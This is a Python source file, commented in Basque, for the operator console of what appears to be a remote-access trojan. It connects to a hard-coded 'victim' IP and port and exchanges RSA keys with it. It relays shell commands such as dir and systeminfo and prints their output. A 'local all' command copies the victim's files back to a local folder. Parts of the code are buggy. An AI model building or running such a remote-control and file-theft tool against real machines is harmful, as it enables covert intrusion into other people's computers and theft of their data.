import socket 
import time
import zlib
import pickle
import os
from fitxategiak.fitxa import bialketa
from fitxategiak.asimetric import asime




class bezeroa(object):
    def __init__(self,ip_biktima,portua):
        self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.so.connect((ip_biktima,portua))
            self.GPG = asime(".")
            self.GPG.Generastekey("cliente")
            print("""
            #  $                  &&&&&&
            # ##                 &&0000&&
            ####################&&&0000&&&
            ####################&&&0000&&&
                                 &&0000&&
                                  &&&&&& 
            RSA
            """)
        except (ConnectionRefusedError):
           print("none server")


    
    def postPuKey(self):
        url = os.getcwd()
        filBT = None
        with open('pUcliente.pem', "rb") as key_file:
           filBT = key_file.read()
        self.so.send(filBT)
    
    def getPuKey(self):
        keyP =  self.so.recv(1024)
        clientKey = open(f'pUserver.pem','w')
        for x in keyP.splitlines():
            clientKey.write(f'{str(x,"utf-8")}\n')
    
    def keysLoad(self):
        self.GPG.loadPublic("pUserver.pem")
        os.chdir("../prybate")
        self.GPG.loadPrymari("prybate.pem")

    def comandLIne(self):
        recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
        recibidoDEc = self.GPG.decrypt(recibido)
        url = str(recibidoDEc,encoding='utf-8')#ruta aktuala string modura pasako du
        mezua  = input(url + ">")
        mezuaENc = self.GPG.encrypted(bytes(mezua,encoding='utf-8'))
        self.so.send(mezuaENc)
        return mezua
    
    def windows_Com(self):
        cmd = self.so.recv(1024) 
        cmdDEc = self.GPG.decrypt(cmd)
        cmd = str(cmdDEc,encoding='utf-8')
        print(cmd)

    def comand_Error(self):
        erro = self.so.recv(2024)
        erroDEc = self.GPG.decrypt(erro)
        erro = str(erroDEc,encoding='utf-8')
        print(erro)

    def koneksioa(self):
        while True:
            recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
            url = str(recibido,encoding='utf-8')#ruta aktuala string modura pasako du
            while True:
                mezua  = input(url + ">")#ruta actuala erantzukizun belezela jarriko du gure erantzuna jaso harte
                if len(mezua) != 0 and mezua.split(" ")[0] != "python":
                    break
            self.so.send(bytes(mezua,encoding = 'utf-8'))# guk idatzitako mezua bidaliko du 
            if mezua == "itxi": # buklea mozteko 
                break
            #funtzioak
            comand = mezua.split(" ")#honen bitartez gure mezua zatitzen dugu espazioaren bitartez
            if comand[0].lower() == "cd" and len(comand) > 1:#lenego zatia cd baldinbada eta bere lusehera 1 baina handiagoa
                erantzuna =  self.so.recv(4095)#cd bidalitako erantzuna jasoko du
                print(str(erantzuna,encoding = 'utf-8')) 
            elif comand[0] != "local":
              luz = self.so.recv(4095)#datuaren luzhera jasoko du 
              self.so.send(bytes("ok",encoding = 'utf-8'))#datua ongi iritzidela adirezten diogu
              erantzuna = self.so.recv(int(luz))#erantzuna jasotzen dugu
              print(str(erantzuna,encoding = 'utf-8')) 
            if comand[0].lower() == "local" and len(comand) > 1 :
              if comand[1].lower() == "all":
                luz_a =  self.so.recv(14095)
                #1
                self.so.send(bytes("ok",encoding = 'utf-8'))
                #2
                fitxategiak_a =  self.so.recv(int(luz_a))
                #3
                self.so.send(bytes("ok",encoding = 'utf-8'))
                #4
                data_arr = pickle.loads(fitxategiak_a)
                print(data_arr[0])
                ruta = "C:\\Users\\web\\Desktop\\nuevoxczx"
                izen_a = data_arr[0]
                fitxa_a = data_arr[1]
                bi = bialketa(izen_a,fitxa_a,ruta,"all") 
                bi.exekutatu()
              erantzuna =  self.so.recv(4095)#5local bidalitako erantzuna jasoko du
              print(str(erantzuna,encoding = 'utf-8'))
              print("adsd")
            #funtzioak
            self.so.send(bytes("ok",encoding = 'utf-8'))# 6 mezua ongi iritxi dela adierazteko
        self.so.close()#koneksioa itxi 




bezeroa = bezeroa("192.168.0.16",9999)
bezeroa.postPuKey()
bezeroa.getPuKey()
bezeroa.keysLoad()

while True:
   comand = bezeroa.comandLIne()
   Com_ALL = ["dir","systeminfo"]
   #try:
   inf = Com_ALL.index(comand)
   windows_Com = ["dir","systeminfo"]
   Balue = None
   y = 0
   for x in windows_Com :
        print(x)
        if x == comand and Balue == None:
            Balue = 0
        y += 1 
   print(Balue)                                     
   switcher = { 
        0: bezeroa.windows_Com(), 
        1: "one", 
        2: "two", 
   }
   switcher.get(Balue)
   #except(ValueError):
   #     bezeroa.comand_Error() 


